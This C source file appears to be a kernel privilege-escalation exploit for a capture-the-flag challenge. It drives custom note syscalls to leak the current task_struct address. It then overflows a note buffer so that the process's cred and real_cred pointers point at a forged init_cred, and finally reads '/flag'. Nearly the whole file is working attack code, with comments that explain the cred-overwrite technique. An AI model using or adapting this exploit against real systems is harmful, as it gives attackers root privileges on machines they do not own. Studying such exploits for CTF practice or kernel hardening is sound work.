#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <errno.h>
#include <assert.h>
#include <poll.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include "utils.h"

#define MAX_LENGTH 4096

#define ADD 548
#define DEL 549
#define SHOW 550
#define COPY 551
#define CUR 552

uint64_t kernel_base, kernel_heap;
uint64_t user_cs, user_ss, user_sp, user_rflags;
uint64_t cur_cred, init_cred;

uint64_t cur_addr(void);
int add_note(char *);
int del_note(void);
int copy_note(char *);
int show_note(char *);

int main(int argv, const char *argc[])
{
    uint64_t cur_task = cur_addr();
    printf("[*] Current task_struct address: 0x%lx\n", cur_task);    
    printf("[*] Current process id: %d\n", getpid());

    char buffer[0x418] = {0};
    // replace cred and real_cred of our task_struct to init_cred => sure thing :)

    // setup fake cred_init
    uint64_t fake_cred_init = cur_task + 0x6a8;
    uint64_t fake_security = cur_task + 0xa8;
    uint64_t fake_user = cur_task + 0xa8*2;
    uint64_t fake_user_ns = cur_task + 0xa8*3;
    uint64_t fake_group_info = cur_task + 0xa8*4;
    uint64_t usage = 0x2;

    printf("[*] fake_cred_init: 0x%lx\n", fake_cred_init);
    memset(buffer, 0x41, 0x400);
    memset(&buffer[0x400], 0x42, 8);
    memcpy(&buffer[0x408], &fake_cred_init, 8);
    memcpy(&buffer[0x410], &fake_cred_init, 8);

    // after overwrite real_cred and cred with fake craft cred_init, avoid using c functions like puts(), getchar() which related to current task?
    // dump_output(buffer, sizeof(buffer));
    add_note(buffer);

    memset(buffer, 0, 0x400);
    memcpy(&buffer, &usage, 8);
    memcpy(&buffer[0x78], &fake_security, 8);
    memcpy(&buffer[0x78+8], &fake_user, 8);
    memcpy(&buffer[0x78+16], &fake_user_ns, 8);
    memcpy(&buffer[0x78+24], &fake_group_info, 8);
    memcpy(&buffer[0xa8*2], &usage, 8);

    // dump_output(buffer, sizeof(buffer));
    copy_note(buffer);
    // copy_note(buffer);
    read_flag("/flag");
    debug();
}

// get address of current task_struct
uint64_t cur_addr()
{
    return syscall(CUR);
}

int add_note(char *buffer)
{
    return syscall(ADD, buffer);
}

int del_note()
{
    return syscall(DEL);
}

int show_note(char *buffer)
{
    return syscall(SHOW, buffer);
}

int copy_note(char *buffer)
{
    return syscall(COPY, buffer);
}